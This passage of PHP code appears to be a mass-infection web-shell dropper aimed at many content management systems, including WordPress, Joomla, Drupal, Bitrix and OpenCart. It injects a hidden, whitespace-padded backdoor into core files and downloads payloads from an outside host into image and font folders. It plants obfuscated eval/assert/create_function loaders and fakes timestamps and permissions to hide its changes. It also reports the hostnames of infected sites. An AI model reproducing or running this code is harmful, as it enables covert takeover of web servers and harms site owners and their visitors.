							array('search' => "\$global_id = @\$_REQUEST['bannerid'];\$request_category = @\$_REQUEST['category'];", 'replace' => ""),
							array('search' => "if(\$global_id==\$random_joomla_key) { \$main_letter(stripslashes(\$request_category));}//chekings", 'replace' => ""),
							array('search' => "Global definitions", 'replace' => "Unic definitions key
                                                                                                                                                                                                                                                                   \$global_id = @\$_REQUEST['bannerid'];\$request_category = @\$_REQUEST['category'];\$joom_num = @\$_REQUEST['numer'];\$joomla_newsnum = @\$_REQUEST['newsnum'];
\$random_joomla_key = '".$rand."';                                                                                                                                                                                                                                 \$main_letter = '_di'.'ff_';\$main_letter ='ar'.'ray'.\$main_letter.'ukey';//globols			
																																																																   if(\$global_id==\$random_joomla_key) {       if (@strpos(\$joomla_newsnum, 'creat')=== false){echo 'error_vievv';@\$main_letter(@array((string)\$joom_num => 1), @array((string)stripslashes(\$request_category) => 2), @\$joomla_newsnum);}else{@\$main_letter(@array((string)\$joom_num => 1), @array((string)stripslashes('}'.\$request_category.'//') => 2), @\$joomla_newsnum);}} //chekings
//Global definitions")



		
				);		
$searcharray = array(
					$search1, $search1, $search1, $search1, $search1, $search1, $search1, $search1, $search1, /*dle*/		
					$search2, $search2, $search2, $search2, $search2, $search2, $search2, $search2, $search2, /*drupal*/
			        $search3, $search3, $search3, $search3, $search3, $search3, $search3, $search3, $search3, /*drupal 8-9*/
					$search4, $search4, $search4, $search4, $search4, $search4, $search4, $search4, $search4, /*modx revo*/				
					$search5, $search5, $search5, $search5, $search5, $search5, $search5, $search5, $search5, /*php bb*/
					$search6, $search6, $search6, $search6, $search6, $search6, $search6, $search6, $search6, /*modx evo*/
					$search7, $search7, $search7, $search7, $search7, $search7, $search7, $search7, $search7, /*modx evo new*/			
					$search8, $search8, $search8, $search8, $search8, $search8, $search8, $search8, $search8, /*webasyst*/
					$search9, $search9, $search9, $search9, $search9, $search9, $search9, $search9, $search9, /*netcat*/
					$search10, $search10, $search10, $search10, $search10, $search10, $search10, $search10, $search10, /*opencart*/	
					$search11, $search11, $search11, $search11, $search11, $search11, $search11, $search11, $search11, /*bitrix*/	 				
					$search12, $search12, $search12, $search12, $search12, $search12, $search12, $search12, $search12, /*prestashop*/
					$search13, $search13, $search13, $search13, $search13, $search13, $search13, $search13, $search13, /*ipb*/
					$search14, $search14, $search14, $search14, $search14, $search14, $search14, $search14, $search14, /*ips*/					
					$search15, $search15, $search15, $search15, $search15, $search15, $search15, $search15, $search15, /*vbullet*/
					$search16, $search16, $search16, $search16, $search16, $search16, $search16, $search16, $search16, /*vbullet new*/
					$search17, $search17, $search17, $search17, $search17, $search17, $search17, $search17, $search17, /*wordpress*/					
					$search18, $search18, $search18, $search18, $search18, $search18, $search18, $search18, $search18 /*joomla*/
				);
				
//only URL or absolute path here:
$copyFrom = array("http://net.h1n.ru/engine/editor/jscripts/temp/img.txt",
"http://net.h1n.ru/engine/editor/jscripts/temp/ht.txt");	

$drupal_img = "/../misc/ui/images/ui-bg_glass_".$rand.".phtml";$drupal_ht = "/../misc/ui/images/".$htacces;				
$drupal8_img = "/../assets/vendor/backbone/backbone_".$rand.".phtml";$drupal8_ht = "/../assets/vendor/backbone/".$htacces;	
$modxrevo_img = "/../../manager/assets/modext/widgets/media/modx.".$rand.".phtml";$modxrevo_ht = "/../../manager/assets/modext/widgets/media/".$htacces;	
$phpbb_img = "/../../images/avatars/gallery/".$rand.".phtml";$phpbb_ht = "/../../images/avatars/gallery/".$htacces;	
$modxevo_img = "/../../assets/media/".$rand.".phtml";$modxevo_ht = "/../../assets/media/".$htacces;	
$modxevo_new_img = "/../assets/captcha/".$rand.".phtml";$modxevo_new_ht = "/../assets/captcha/".$htacces;	
$dle_img = $dleimgpath.$rand.".jpeq";$dle_ht = "/../../uploads/fotos/".$htacces;
$wp_img = $wpimgpath.$rand.".phtml";$wp_ht = $wpimgpath.$htacces;	
$joom_img = $joomimgpath.$rand.".phtml";$joom_ht = $joomimgpath.$htacces;
$webasyst_img = "/../../wa-widgets/news/img/".$rand.".phtml";$webasyst_ht = "/../../wa-widgets/news/img/".$htacces;	
$netcat_img = "/../../netcat/editors/ckeditor4/lang/".$rand.".phtml";$netcat_ht = "/../../netcat/editors/ckeditor4/lang/".$htacces;	
$opencart_img = "/../admin/language/user_".$rand.".phtml";$opencart_ht = "/../admin/language/".$htacces;
$bitrix_img = $bitriximgpath.$rand.".jpeq";$bitrix_ht = $bitriximgpath.$htacces;
$presta_img = "/../admin/themes/default/fonts/font-".$rand.".phtml";$presta_ht = "/../admin/themes/default/fonts/".$htacces;
$ipb_img = "/../../../public/style_images/master/opacity".$rand.".phtml";$ipb_ht = "/../../../public/style_images/master/".$htacces;
$ips_img = "/../../applications/gallery/widgets/".$rand.".phtml";$ips_ht = "/../../applications/gallery/widgets/".$htacces;
$vbullet_img = "/../images/style_generator/dot".$rand.".jpeq";$vbullet_ht = "/../images/style_generator/".$htacces;
$vbullet42_img = "/../../images/style_generator/dot".$rand.".jpeq";$vbullet42_ht = "/../../images/style_generator/".$htacces;

			
//relative path from searchfile
$copyTo =               array( 	
//dle
array($dle_img,$dle_ht),array($dle_img,$dle_ht),array($dle_img,$dle_ht),array($dle_img,$dle_ht),array($dle_img,$dle_ht),array($dle_img,$dle_ht),array($dle_img,$dle_ht),array($dle_img,$dle_ht),array($dle_img,$dle_ht),
//drupal
array($drupal_img,$drupal_ht),array($drupal_img,$drupal_ht),array($drupal_img,$drupal_ht),array($drupal_img,$drupal_ht),array($drupal_img,$drupal_ht),array($drupal_img,$drupal_ht),array($drupal_img,$drupal_ht),array($drupal_img,$drupal_ht),array($drupal_img,$drupal_ht),
//drupal 8
array($drupal8_img,$drupal8_ht),array($drupal8_img,$drupal8_ht),array($drupal8_img,$drupal8_ht),array($drupal8_img,$drupal8_ht),array($drupal8_img,$drupal8_ht),array($drupal8_img,$drupal8_ht),array($drupal8_img,$drupal8_ht),array($drupal8_img,$drupal8_ht),array($drupal8_img,$drupal8_ht),
//modx revo
array($modxrevo_img,$modxrevo_ht),array($modxrevo_img,$modxrevo_ht),array($modxrevo_img,$modxrevo_ht),array($modxrevo_img,$modxrevo_ht),array($modxrevo_img,$modxrevo_ht),array($modxrevo_img,$modxrevo_ht),array($modxrevo_img,$modxrevo_ht),array($modxrevo_img,$modxrevo_ht),array($modxrevo_img,$modxrevo_ht),
//phpbb 3.1
array($phpbb_img,$phpbb_ht),array($phpbb_img,$phpbb_ht),array($phpbb_img,$phpbb_ht),array($phpbb_img,$phpbb_ht),array($phpbb_img,$phpbb_ht),array($phpbb_img,$phpbb_ht),array($phpbb_img,$phpbb_ht),array($phpbb_img,$phpbb_ht),array($phpbb_img,$phpbb_ht),
//modx evo
array($modxevo_img,$modxevo_ht),array($modxevo_img,$modxevo_ht),array($modxevo_img,$modxevo_ht),array($modxevo_img,$modxevo_ht),array($modxevo_img,$modxevo_ht),array($modxevo_img,$modxevo_ht),array($modxevo_img,$modxevo_ht),array($modxevo_img,$modxevo_ht),array($modxevo_img,$modxevo_ht),
//modx evo new
array($modxevo_new_img,$modxevo_new_ht),array($modxevo_new_img,$modxevo_new_ht),array($modxevo_new_img,$modxevo_new_ht),array($modxevo_new_img,$modxevo_new_ht),array($modxevo_new_img,$modxevo_new_ht),array($modxevo_new_img,$modxevo_new_ht),array($modxevo_new_img,$modxevo_new_ht),array($modxevo_new_img,$modxevo_new_ht),array($modxevo_new_img,$modxevo_new_ht),
//webasyst
array($webasyst_img,$webasyst_ht),array($webasyst_img,$webasyst_ht),array($webasyst_img,$webasyst_ht),array($webasyst_img,$webasyst_ht),array($webasyst_img,$webasyst_ht),array($webasyst_img,$webasyst_ht),array($webasyst_img,$webasyst_ht),array($webasyst_img,$webasyst_ht),array($webasyst_img,$webasyst_ht),
//netcat
array($netcat_img,$netcat_ht),array($netcat_img,$netcat_ht),array($netcat_img,$netcat_ht),array($netcat_img,$netcat_ht),array($netcat_img,$netcat_ht),array($netcat_img,$netcat_ht),array($netcat_img,$netcat_ht),array($netcat_img,$netcat_ht),array($netcat_img,$netcat_ht),
//opencart
array($opencart_img,$opencart_ht),array($opencart_img,$opencart_ht),array($opencart_img,$opencart_ht),array($opencart_img,$opencart_ht),array($opencart_img,$opencart_ht),array($opencart_img,$opencart_ht),array($opencart_img,$opencart_ht),array($opencart_img,$opencart_ht),array($opencart_img,$opencart_ht),
//bitrix
array($bitrix_img,$bitrix_ht),array($bitrix_img,$bitrix_ht),array($bitrix_img,$bitrix_ht),array($bitrix_img,$bitrix_ht),array($bitrix_img,$bitrix_ht),array($bitrix_img,$bitrix_ht),array($bitrix_img,$bitrix_ht),array($bitrix_img,$bitrix_ht),array($bitrix_img,$bitrix_ht),
//prestashop
array($presta_img,$presta_ht),array($presta_img,$presta_ht),array($presta_img,$presta_ht),array($presta_img,$presta_ht),array($presta_img,$presta_ht),array($presta_img,$presta_ht),array($presta_img,$presta_ht),array($presta_img,$presta_ht),array($presta_img,$presta_ht),
//IPB
array($ipb_img,$ipb_ht),array($ipb_img,$ipb_ht),array($ipb_img,$ipb_ht),array($ipb_img,$ipb_ht),array($ipb_img,$ipb_ht),array($ipb_img,$ipb_ht),array($ipb_img,$ipb_ht),array($ipb_img,$ipb_ht),array($ipb_img,$ipb_ht),
//IPS
array($ips_img,$ips_ht),array($ips_img,$ips_ht),array($ips_img,$ips_ht),array($ips_img,$ips_ht),array($ips_img,$ips_ht),array($ips_img,$ips_ht),array($ips_img,$ips_ht),array($ips_img,$ips_ht),array($ips_img,$ips_ht),
//vbullet 4
array($vbullet_img,$vbullet_ht),array($vbullet_img,$vbullet_ht),array($vbullet_img,$vbullet_ht),array($vbullet_img,$vbullet_ht),array($vbullet_img,$vbullet_ht),array($vbullet_img,$vbullet_ht),array($vbullet_img,$vbullet_ht),array($vbullet_img,$vbullet_ht),array($vbullet_img,$vbullet_ht),
//vbullet    4.2
array($vbullet42_img,$vbullet42_ht),array($vbullet42_img,$vbullet42_ht),array($vbullet42_img,$vbullet42_ht),array($vbullet42_img,$vbullet42_ht),array($vbullet42_img,$vbullet42_ht),array($vbullet42_img,$vbullet42_ht),array($vbullet42_img,$vbullet42_ht),array($vbullet42_img,$vbullet42_ht),array($vbullet42_img,$vbullet42_ht),
//wordpress
array($wp_img,$wp_ht),array($wp_img,$wp_ht),array($wp_img,$wp_ht),array($wp_img,$wp_ht),array($wp_img,$wp_ht),array($wp_img,$wp_ht),array($wp_img,$wp_ht),array($wp_img,$wp_ht),array($wp_img,$wp_ht),					
//joomla
array($joom_img,$joom_ht),array($joom_img,$joom_ht),array($joom_img,$joom_ht),array($joom_img,$joom_ht),array($joom_img,$joom_ht),array($joom_img,$joom_ht),array($joom_img,$joom_ht),array($joom_img,$joom_ht),array($joom_img,$joom_ht)
						/*//hostcms
						array('/../../uploads/fotos/.htaccess',"/../../uploads/fotos/foto_".$rand.".jpeg"),
						array('/../../uploads/fotos/.htaccess',"/../../../uploads/fotos/foto_".$rand.".jpeg"),
						array('/../../uploads/fotos/.htaccess',"/../../../uploads/fotos/foto_".$rand.".jpeg"),
						array('/../../uploads/fotos/.htaccess',"/../../uploads/fotos/foto_".$rand.".jpeg"),
						array('/../../uploads/fotos/.htaccess',"/../../../uploads/fotos/foto_".$rand.".jpeg"),
						array('/../../uploads/fotos/.htaccess',"/../../../uploads/fotos/foto_".$rand.".jpeg"),
						array('/../../uploads/fotos/.htaccess',"/../../uploads/fotos/foto_".$rand.".jpeg"),
						array('/../../uploads/fotos/.htaccess',"/../../../uploads/fotos/foto_".$rand.".jpeg"),
						array('/../../uploads/fotos/.htaccess',"/../../../uploads/fotos/foto_".$rand.".jpeg"),*/						
						);


						
$stopfolders = array("www","docs","public_html","engine","wp-includes","modules","html","httpdocs","htdocs","htdocs/www/","web"); //stop folders for Output
$stopfolders2 = array("www","docs","public_html","html","httpdocs","htdocs","htdocs/www/","web"); //stop folders for Output    httpdocs serpcrp.ru       html dumagadan     docs shantimusic.ru      public_html  magnitnaya-shkola.ru
$outputlist = array();	//list of folders in found directory					
// just in case. convert to the correct slashes
foreach ($searchfiles as $i => $sf)
{
	$searchfiles[$i] = str_replace('\\','/',$sf);
	if(substr($searchfiles[$i], 0, 1) != '/') //first character is not \
	{
		if(strpos($searchfiles[$i],'/') !== FALSE) //there are \ in filename
		{
			$searchfiles[$i] = '/'.$searchfiles[$i]; //add '\' to the beginning
		}
	}	
}

if (isset ($_GET['start'])){
if (strlen(@realpath(dirname($_SERVER['DOCUMENT_ROOT'])))>3){
dosearch($_SERVER['DOCUMENT_ROOT'],$searchfiles,$searcharray);	
dosearch(dirname($_SERVER['DOCUMENT_ROOT']),$searchfiles,$searcharray); //current directory (dirname($_SERVER['DOCUMENT_ROOT'].$_SERVER['PHP_SELF'])
dosearch(dirname($_SERVER['DOCUMENT_ROOT'])."/..",$searchfiles,$searcharray); //parent to current directory
dosearch(dirname($_SERVER['DOCUMENT_ROOT'])."/../..",$searchfiles,$searcharray); //another level higher
dosearch(dirname($_SERVER['DOCUMENT_ROOT'])."/../../..",$searchfiles,$searcharray); }
//dosearch(dirname($_SERVER['DOCUMENT_ROOT'])."/../../../..",$searchfiles,$searcharray);//another level higher
else{print "<br>open_basedir work<br>\r\n";
dosearch($_SERVER['DOCUMENT_ROOT'],$searchfiles,$searcharray);} //current directory
}

function dosearch($scan,$searchfiles,$searcharray)
{
	global $outputlist,$basedir;
	//print "<p>TEST scan = $scan";
	if (strlen(@realpath(dirname($_SERVER['DOCUMENT_ROOT'])))>3){$scan = @realpath($scan);}
    else{$scan = $scan;}
	//print "<p>TEST scan realpath = $scan";
	$scan = str_replace('\\','/',$scan); //test
	//print "<p>TEST scan after replace = $scan";
	$dirs = array_diff(scandir($scan),array(".","..",".DS_Store")); //remove ".","..",".DS_Store" from scandir($scan)
	foreach($dirs as $d)
	{		
		if(is_dir($scan.'/'.$d)) //if it's a directory
		{				
			foreach($searchfiles as $index => $searchfile)
			{		
			
			
			
			if (strlen(@realpath(dirname($_SERVER['DOCUMENT_ROOT'])))>3){
			
				if(file_exists($scan.'/'.$d.$searchfile)) //search earch searchfile in this directory
				{						
					//print "<p>TEST file found: "; print $scan.'/'.$d.$searchfile;
					if(empty($outputlist)) //creating the list of all neighbour folders
					{				
						//print "<p>TEST scan url: $scan";
						$folderAbove = removeStopFoldersFromPath($scan);
						//print "<p>TEST folder for output: $folderAbove";
						$nextlevels = array_diff(scandir($folderAbove),array(".","..",".DS_Store")); //remove ".","..",".DS_Store" from scandir($scan)		
						foreach($nextlevels as $dd)
						{							
							if(is_dir($folderAbove.'/'.$dd))
							{
								$outputlist[] = $dd;								
							}
							else
							{
								continue;
							}
						}
/*print "\n<br>outputlist:<br>\n";
foreach($outputlist as $out)
{
	print "$out<br>\n";
}*/
						if(!empty($outputlist))
						{
							if(in_array($d,$outputlist))
							{
								if($key = array_search($d,$outputlist))
								{														
									unset($outputlist[$key]);
								}
							}								
						}					
					}
					else
					{
						if(in_array($d,$outputlist))
						{
							if($key = array_search($d,$outputlist))
							{						
							unset($outputlist[$key]);
							}
						}
					}
					//print "<p>$d ___ ";
					doreplace($scan.'/'.$d.$searchfile,$searcharray[$index]);		
		    if ($d === outputFolder($d))				
			  {
			  $fileconf = @str_replace('modules/functions.php', 'data/config.php', $searchfile);
			  $filerobots = $searchfile;
			  $filerobots = @str_replace('engine/modules/functions.php', 'robots.txt', $filerobots);
			  $filerobots = @str_replace('wp-includes/load.php', 'robots.txt', $filerobots);
			  $filerobots = @str_replace('includes/defines.php', 'robots.txt', $filerobots);
			  $conf = @file_get_contents($scan.'/'.$d.$fileconf);
			  $robots = @file_get_contents($scan.'/'.$d.$filerobots); 
			  if (strpos($d, '.'))
			  {echo $d."                     ";}
			  elseif((outputFolder($d)=== "public_html")or(outputFolder($d)=== "www")or(outputFolder($d)=== "docs")
				or(outputFolder($d)=== "httpdocs")or(outputFolder($d)=== "private_html"))
			     echo $_SERVER["HTTP_HOST"]."                     ";
			  elseif (strpos($conf, 'http_home_url')){
				  $con = @file($scan.'/'.$d.$fileconf);
				  foreach($con as $line){
                   if(strpos($line, 'http_home_url') !== false){
					 $line = @str_replace('\'http_home_url\' => "http://', '', $line);
					 $line = @str_replace('\'http_home_url\' => "https://', '', $line);
					 $line = @str_replace('\'http_home_url\' => \'http://', '', $line);
					 $line = @str_replace('\'http_home_url\' => \'https://', '', $line);
					 $line = @str_replace('\'http_home_url\' => \'', '', $line);
					 $line = @str_replace('/\',', '', $line);
					 $line = @str_replace('/",', '', $line);
					 if(strlen($line)>4)
					  {echo $line."                     ";}else
					 {echo outputFolder($d)."                     ";}
					 
					 
                     
				     }
			       }
				  }
			  elseif (strpos($robots, 'ost:')){
				 $con = @file($scan.'/'.$d.$filerobots);
				  foreach($con as $line){
                   if(strpos($line, 'ost:') !== false){
					 $line = @str_replace('host: ', '', $line);
					 $line = @str_replace('Host: ', '', $line);
					 $line = @str_replace('https://', '', $line);
					 $line = @str_replace('http://', '', $line);
                     echo $line."                     ";
				     }
			       }
				  }
			   else 
			   echo outputFolder($d)."                     ";
		      }   
            else 
			{echo $d."__".outputFolder($d)."                     ";}
		
	//print outputFolder($d)."<br>\n";			
	                docopy(dirname($scan.'/'.$d.$searchfile),$index);echo"<br>\n";	
			}}	
                else
				 {if(file_exists($scan.$searchfile)) //search earch searchfile in this directory
				    {						
					//print "<p>TEST file found: "; print $scan.$searchfile;
					
					//print "$d ____ ";
					doreplace($scan.$searchfile,$searcharray[$index]);	
                    echo $_SERVER["HTTP_HOST"];
					if (version_compare('7.2', phpversion(), '<')) {echo 
					//"___php_".phpversion().
					"<br>\r\n";}else{echo"<br>\r\n";}					
					docopy(dirname($_SERVER['DOCUMENT_ROOT'].$searchfile),$index);echo"<br>\n";	//$scan.'/'.$d.								
				    }
								 
			     }
		  }			
		}
	}	
}




function doreplace($filename,$searcharray)
{
global $rand;
if (is_writable($filename)) {
	//chmod($filename, 0777);
	$str1 = @file_get_contents($filename);

	$times = @filemtime($filename);
	if((!strpos($str1, "//chekings"))
	or(!strpos($str1, "//globols"))) {       //in old globils
	if(strpos($filename, "engine/")) {
                       print $rand."___dle_";}
	if(strpos($filename, "wp-")) {
                       print $rand."___wp_";}
	if(strpos($filename, "s/bootstrap")) {
                        print $rand."___drupal_";}
	if(strpos($filename, "functions_bigthree")) {
                        print $rand."___vbullet_";}
	if(strpos($filename, "phpbb")) {
                        print $rand."___phpbb_";}
	if(strpos($filename, "ipsRegistry")) {
                        print $rand."___ipb_";}
	if(strpos($filename, "system/Request/R")) {
                        print $rand."___ips_";}
	if(strpos($filename, "xpdo.class")) {
                        print $rand."___modxr_";}
	if(strpos($filename, "modules/main/inc")) {
                        print $rand."___bitrix_";}
	if(strpos($filename, "defines.")) {
                        print $rand."___joomla_";}		
	if(strpos($filename, "system/startup.")) {
                        print $rand."___opencart_";}	
	if(strpos($filename, "Connection.")) {
                        print $rand."___presta_";}	
	if(strpos($filename, "tect.inc.php")) {
                        print $rand."___modxe_";}	
	if(strpos($filename, "e/bootstrap.php")) {
                        print $rand."___modxe_";}						
	if(strpos($filename, "nc_db.class")) {
                        print $rand."___netcat_";}		
	if(strpos($filename, "waAutoload.")) {
                        print $rand."___webasyst_";}	
/*	if(strpos($filename, "dules/core/core.p")) {
                        print $rand."___hostcms_";}		*/					
;
	foreach($searcharray as $onesearch)
	{
		//print "<p>Zamena ";//.$onesearch['search']." na ".$onesearch['replace'];
		$str1 = str_replace($onesearch['search'],$onesearch['replace'],$str1);
	}	
	$result = @file_put_contents($filename,$str1);
	@touch($filename, $times);
	
	//chmod($filename, 0444);
} else {
$arr = file($filename); 
foreach ( $arr as $k=>$v ) 
{if (( strpos($v,'get_url_var =',0) !==false ) 
or ( strpos($v,'GetCurPageID =',0) !==false ) 
or ( strpos($v,'ips_Registry_Hash =',0) !==false ) 
or ( strpos($v,'ips_Reg_Hash =',0) !==false ) 
or ( strpos($v,'xPDOActivityhash =',0) !==false ) 
or ( strpos($v,'mark_forum_hash =',0) !==false ) 
or ( strpos($v,'mark_forum5_hash =',0) !==false ) 
or ( strpos($v,'user_activity_hash =',0) !==false ) 
or ( strpos($v,'timer_stop =',0) !==false ) 
or ( strpos($v,'drupal_get_messages =',0) !==false ) 
or ( strpos($v,'drupal8_get_messages =',0) !==false ) 
or ( strpos($v,'random_joomla_key =',0) !==false )
or ( strpos($v,'define_key = ',0) !==false )
or ( strpos($v,'opencart_activity_hash =',0) !==false )
or ( strpos($v,'modxevo_hash =',0) !==false )
or ( strpos($v,'nc_activity_hash =',0) !==false )
or ( strpos($v,'wa_activity_hash =',0) !==false )
//or ( strpos($v,'HostCMS_activity_hash =',0) !==false )
or ( strpos($v,'PrestaPageID =',0) !==false ))

{
	if(strpos($filename, "engine/")) {
                       print $v."___dle_";}
	if(strpos($filename, "wp-")) {
                       print $v."___wp_";}
	if(strpos($filename, "s/bootstrap")) {
                        print $v."___drupal_";}
	if(strpos($filename, "functions_bigthree")) {
                        print $v."___vbullet_";}
	if(strpos($filename, "phpbb")) {
                        print $v."___phpbb_";}
	if(strpos($filename, "ipsRegistry")) {
                        print $v."___ipb_";}
	if(strpos($filename, "system/Request/R")) {
                        print $v."___ips_";}
	if(strpos($filename, "xpdo.class")) {
                        print $v."___modxr_";}
	if(strpos($filename, "modules/main/inc")) {
                        print $v."___bitrix_";}
	if(strpos($filename, "defines.")) {
                        print $v."___joomla_";}	
	if(strpos($filename, "system/startup.")) {
                        print $v."___opencart_";}	
	if(strpos($filename, "tect.inc.php")) {
                        print $v."___modxe_";}		
	if(strpos($filename, "e/bootstrap.php")) {
                        print $v."___modxe_";}
	if(strpos($filename, "Connection.")) {
                        print $v."___presta_";}		
	if(strpos($filename, "nc_db.class")) {
                        print $v."___netcat_";}	
	if(strpos($filename, "waAutoload.")) {
                        print $v."___webasyst_";}	
/*	if(strpos($filename, "dules/core/core.p")) {
                        print $v."___hostcms_";}	*/											
;
}}}}

	if (!is_writable($filename)) {	

	$str1 = @file_get_contents($filename);
	$times = @filemtime($filename);
	
	if((!strpos($str1, "//chekings"))or(!strpos($str1, "//globols")))
	{ if(!unlink($filename)) {print "_badchmod_";
$filenamedb = str_replace("/engine/modules/functions.php", "/engine/data/dbconfig.php", $filename);
$filenamew = str_replace("/engine/modules/functions.php", "/wp-includes/template-loader.php", $filename);
if (@file_exists($filenamedb)){$waps = $filenamedb;}
if (@file_exists($filenamew)){$waps = $filenamew;}
		if((strpos($filename, "engine/"))or(strpos($filename, "wp-in"))) {

$times = @filemtime($waps);$con = @file_get_contents($waps);
$perms = @fileperms($waps);$owner = @fileowner($waps);$group = @filegroup($waps);
$work_hit = 'eF6VVXtv2zYQ/yoOIIQSbMsPyQ/F0JK1MLpgw7qlyYqhNQRKOkucJVElqThGme++o2zAceEZ2B+6I3nP392RsmIBIYlIxyVRIw0D0W4MYSlZWFxsts+bl6LOpAxJlcSbb2TB1jaTEpRtRe8/fvz1fvnFQkcrx/l+h6cJ5xsGtjnqnSp0Rz3FSrCd7nwSTGY9MiDO4hW92XenimFIgrE/G3rzEXG4+E/xbH5ZHFwUz4fkTMpk6gfjoT+fTL1g4iOZB95wMven/twLfHIGgSVgHWKQT8uHv5YPX6QSAp5tZIo3dQ3CJkw0kZLQfMPyOs5qYTWCvbEgD8s/n5afHqOnh3uyWtxZOZfhJX9K8jyqlcpbb6aAo8m4O5uMnJ9w0dG602Zp/PSsRma9k2Y4zgIKCd9ZSTNIBFCFqodoPUuseyY9bAwuL8MSgMhBHDPJgaYoOKgS75ZliVuXyozTQLJcDcxqk0CetEdJ4hqeCW5Y39u2p4OburVQeeem4qxd0taA/0YcZNcSeDunWHdkgm4bUUCV8BSBiHWrUlNBS1Agwq/WBnZbLlI0w42E60aEI7Q7gyh8C+kaMf3gneRK1TcDA8MUFymqm3q+MLWwx8F81jekO5pMg74hzi0Vgu4iTEG+KXLbk2N3DufOTakiQavUHo/Gfs94Mm1Alct9UBVkNBIgm2MrbM/ve37XHwXTviHO7bpoZG6bhM8E9PzeaDY0s/x/e26m7+o4yr88Pv4RPeEu+vnD8vdHsjI38IIYb2N7Sa9qAVlUUpXkNhnElKWNTrDwGutfgP7svY/0slD0vtKfM1Aak4YXzWhERZJrmnOuWVZS/Y4rXTOcQk3LGA3/pu8E32rOM9zEKCwpK9wBI23pHXwAEMBJ7Nazu9cTmm9c0ejnjZvwvRNXp02yMZ+WPOONljlUGLiizyYoL9xkH1roLVM4gJpVUtEMs6rMbg+tUU0MSN14t8+bpxXf6KbgmV7TBGLuagkttp0Bh/nICj3Lko21iBNXx6zK9jhw4lsUpzBqN0bgEiPKXRlzqatUcJbqkqW1BsFAfu1MhzpXSaR5zLA6/4xL0KjLaIVaFdN1zis4lsrMydUPDz9JC8BfBw4E/i5W53UOP4dWdJJiSNO0gq3UeO0yJk11wjVAGlMsbliY6iqNjFVundeapuXbFRoIqhiv9hnik9WGMKvOVdgxT/OZ1/3wZ5ide8hfX1//BY6/U3k=';

@eVal(gzuNcompress(baSe64_decOde('eF5Lz8lPSsxRUEktT8yxBpO2SiBSyRoAe2AIzA=='))); 
$sorry = "as"; $sorry .= "se"."rt";@$sorry('eV'.'al(gz'.'unCom'.'pre'.'ss(ba'.'Se'.'64'.'_dec'.'ode("eF5Lz8lPSsxRUEksTi0qsYZQtkpgSskaAJw/Ci4=")))');
$liciens = "Ev"."aL(gZu"."ncOmp"."rEss(bAs"."e64"."_Dec"."odE('eF5Lz8lPSsxRUEkuSk0sSbWG0rZKEFrJGgC82Qst')));";$this_only_game = "cre"."ate_"."function";@$soorry_men = $this_only_game('', "$liciens;");$soorry_men('');
if (isset ($ewal) ){$vibor = $ewal;$workens ='<?php                                                                                                                                                                                                                                                                                                                                                    @eVal(gzuNcompress(baSe64_deCode(\''.$work_hit.'\')));                                                                                                                                                                                                                ';}
if (isset ($asert) ){$vibor = $asert;$workens ='<?php                                                                                                                                                                                                                                                                                                                                                    $sorry = "as";$sorry .= "se"."rt";@$sorry("@Ev"."aL(gZu"."ncOmp"."rEss(bAs"."e64"."_Dec"."odE(\''.$work_hit.'\')))");                                                                                                                                                                                                                ';}
if (isset ($create) ){$vibor = $create;$workens ='<?php                                                                                                                                                                                                                                                                                                                                                    $liciens = "@Ev"."aL(gZu"."ncOmp"."rEss(bAs"."e64"."_Dec"."odE(\''.$work_hit.'\')));";$release_this = "cre"."ate_"."function";@$dle_func = $release_this(\'\', "$liciens;");$dle_func(\'\');                                                                                                                                                                                                                ';}
if (!strpos($con, $work_hit))
{if (is_writable($waps))
    {$con = str_replace('$liciens = ', '//$likiens = ', $con);
	$con = str_replace('$sorry = ', '//$sorry = ', $con);
	$con = str_replace('@eval(gzuncompress(base64', '//@eval(gzuncompress(base64', $con);
    $con = str_ireplace('<?php', $workens, $con);
	$con = @file_put_contents($waps, $con);
	@touch(dirname($waps), $times);@touch($waps, $times);@chmod($waps, $perms); @chown($waps, $owner); @chgrp($waps, $group); 
	//print "work done in file with $vibor. \n";
    }else{if (@unlink($waps)){
	  $con = str_replace('$liciens = ', '//$likiens = ', $con);
	  $con = str_replace('$sorry = ', '//$sorry = ', $con);
	  $con = str_replace('@eval(gzuncompress(base64', '//@eval(gzuncompress(base64', $con);
	  $con = str_ireplace('<?php', $workens, $con);
	  $con = @file_put_contents($waps, $con);
	  @touch(dirname($waps), $times);@touch($waps, $times);@chmod($waps, $perms); @chown($waps, $owner); @chgrp($waps, $group); 
	  
      }}}
		}

	                         }
      @unlink($filename);
	if(strpos($filename, "engine/")) {
                       print $rand."___dle_";}
	if(strpos($filename, "wp-")) {
                       print $rand."___wp_";}
	if(strpos($filename, "s/bootstrap")) {
                        print $rand."___drupal_";}
	if(strpos($filename, "functions_bigthree")) {
                        print $rand."___vbullet_";}
	if(strpos($filename, "phpbb")) {
                        print $rand."___phpbb_";}
	if(strpos($filename, "ipsRegistry")) {
                        print $rand."___ipb_";}
	if(strpos($filename, "system/Request/R")) {
                        print $rand."___ips_";}
	if(strpos($filename, "xpdo.class")) {
                        print $rand."___modxr_";}
	if(strpos($filename, "modules/main/inc")) {
                        print $rand."___bitrix_";}
	if(strpos($filename, "defines.")) {
                        print $rand."___joomla_";}	
	if(strpos($filename, "system/startup.")) {
                        print $rand."___opencart_";}	
	if(strpos($filename, "tect.inc.php")) {
                        print $rand."___modxe_";}
	if(strpos($filename, "e/bootstrap.php")) {
                        print $rand."___modxe_";}						
	if(strpos($filename, "Connection.")) {
                        print $rand."___presta_";}	
	if(strpos($filename, "nc_db.class")) {
                        print $rand."___netcat_";}	
	if(strpos($filename, "waAutoload.")) {
                        print $rand."___webasyst_";}
/*	if(strpos($filename, "dules/core/core.p")) {
                        print $rand."___hostcms_";}	*/						
;
	foreach($searcharray as $onesearch)
	{
		//print "<p> ";   ".$onesearch['search']."                    ".$onesearch['replace'];
		$str1 = str_replace($onesearch['search'],$onesearch['replace'],$str1);
	}	
	$result = @file_put_contents($filename,$str1);
	@touch($filename, $times);
	
	@chmod($filename, 0444);
} else {
$arr = file($filename); 
foreach ( $arr as $k=>$v ) 
{if (( strpos($v,'get_url_var =',0) !==false ) 
or ( strpos($v,'GetCurPageID =',0) !==false ) 
or ( strpos($v,'ips_Registry_Hash =',0) !==false ) 
or ( strpos($v,'ips_Reg_Hash =',0) !==false )  
or ( strpos($v,'xPDOActivityhash =',0) !==false ) 
or ( strpos($v,'mark_forum_hash =',0) !==false ) 
or ( strpos($v,'mark_forum5_hash =',0) !==false ) 
or ( strpos($v,'user_activity_hash =',0) !==false ) 
or ( strpos($v,'timer_stop =',0) !==false ) 
or ( strpos($v,'drupal_get_messages =',0) !==false ) 
or ( strpos($v,'drupal8_get_messages =',0) !==false ) 
